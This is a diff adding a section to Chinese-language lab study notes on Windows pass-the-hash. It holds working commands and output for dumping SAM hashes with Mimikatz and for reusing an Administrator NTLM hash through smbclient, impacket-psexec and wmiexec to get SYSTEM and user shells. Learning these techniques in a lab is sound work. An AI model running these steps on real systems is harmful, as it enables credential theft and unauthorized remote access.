@@ -4161,3 +4161,142 @@ Hash.Target......: 3ae8e5f0ffabb3a627672e1600f1ba10
 ![image](https://hackmd.io/_uploads/B1YJiO3FJl.png)
 
 ### Passing NTLM
+根據密碼強度， NTLM hash 爆破耗時也可能沒有結果。\
+如何透過不破解來利用 NTLM 雜湊 👉🏻 `pass-the-hash (PtH)`
+
+- pass-the-hash (PtH)
+攻擊者可以使用有效的 username 和 NTLM password hash 來進行身份驗證，而不需要明文密碼。\
+這是因為 NTLM/LM 密碼雜湊在 Windows 系統中是靜態的，並且不會在每次登錄會話中進行變化，也不會加鹽。這使得 attacker 能夠在目標機器之間，使用相同的雜湊來進行身份驗證，無論是本地還是遠程的目標系統。但必須有管理員權限。
+
+如果不使用本地的 Administrator 用戶，那麼目標機器必須以特定方式配置才能成功執行，啟用 Windows Vista 後，所有 Windows 系統預設啟用了 [UAC remote restrictions](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction)，阻止了軟體或指令以管理權限在遠端系統上執行。
+
+#### 1. Mimikatz 查看儲存的系統憑證
+範例架設有兩台 machines: VM1 (192.168.111.212)  & VM2 (192.168.111.211)\
+已成功登入 VM1 `gunther:password123!`
+在 VM1 上透過 File Explorer 使用 SMB share 存取 VM2: `\\192.168.111.212\secrets`
+![image](https://hackmd.io/_uploads/S17T2Y2t1g.png)
+> 輸入 user:gunther 無法存取
+>> 代表 VM2 沒有這位使用者
+>> 👉🏻 利用 Mimikatz 來取得管理員的 NTLM Hash
+
+```
+PS C:\tools> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # token::elevate
+...
+
+mimikatz # lsadump::sam
+Domain : FILES01
+SysKey : 509cc0c46295a3eaf4c5c8eb6bf95db1
+Local SID : S-1-5-21-1555802299-1328189896-734683769
+
+SAMKey : 201b0e3078f2be635aaaa055ab5a7828
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 7a38310ea6f0027ee955abed1762964b
+
+...
+
+RID  : 000003f0 (1008)
+User : files02admin
+  Hash NTLM: e78ca771aeb91ea70a6f1bb372c186b6
+...
+
+```
+> 取得 Administrator NTLM hash
+
+#### 2. SMB enumeration and management
+為了使用 pass-the-hash (PtH)，需要使用支援 NTLM 雜湊進行驗證的工具:
+- [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
+- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
+- scripts from the impacket library:  [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py) & [wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)
+
+使用 smbclient 存取 VM2 secret/
+```
+┌──(chw㉿CHW)-[~]
+└─$ smbclient \\\\192.168.111.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Thu Jun  2 16:55:37 2022
+  ..                                DHS        0  Fri Feb 14 04:17:11 2025
+  secrets.txt                         A       16  Thu Sep  1 12:23:32 2022
+
+                4554239 blocks of size 4096. 1601419 blocks available
+smb: \> get secrets.txt
+getting file \secrets.txt of size 16 as secrets.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \> 
+```
+> `雙反斜\\`: 用來轉義特殊字元\
+> `--pw-nt-hash`: 傳遞 NTLM Hash
+
+使用 NTLM Hash 成功存取 SMB share
+
+#### 3. Obtain an interactive shell
+這次使用 impacket 中的 psexec.py 腳本，可將執行檔上傳到 SMB share\
+`-hashes`驗證格式為: `LMHash:NTHash`，但因為我們只使用 NTLM hash，可以用 32 個 0 填充 LMHash 部分。
+```
+┌──(chw㉿CHW)-[~]
+└─$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.111.212
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Requesting shares on 192.168.111.212.....
+[*] Found writable share ADMIN$
+[*] Uploading file fuurXoll.exe
+[*] Opening SVCManager on 192.168.111.212.....
+[*] Creating service LeqM on 192.168.111.212.....
+[*] Starting service LeqM.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.707]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> ipconfig
+ 
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::7979:1856:9a4e:6c19%4
+   IPv4 Address. . . . . . . . . . . : 192.168.111.212
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.111.254
+
+C:\Windows\system32> whoami
+nt authority\system
+
+```
+>[!Important]
+>在 psexec 命令的最後，我們可以指定一個額外的參數，用來決定 psexec 在目標系統上執行的命令。\
+>如果我們不指定這個參數(如上)，默認情況下會執行 `cmd.exe`，這樣會啟動目標系統上的命令提示，並提供一個交互式的界面。
+>其他參數: `powershell.exe`, `explorer.exe`
+
+以上以 SYSTEM 身份成功取得互動式 shell
+
+#### 4. Obtain shell as the user we used for authentication
+以上都是以 SYSTEM 身份而不是我們用於驗證身份的 user 接收 shell。\
+可以使用 impacket 中的 wmiexec.py 腳本，來取得用於身份驗證的使用者 shell
+```        
+┌──(chw㉿CHW)-[~]
+└─$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.111.212
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+VM2\administrator
+```
+
+### Cracking Net-NTLMv2
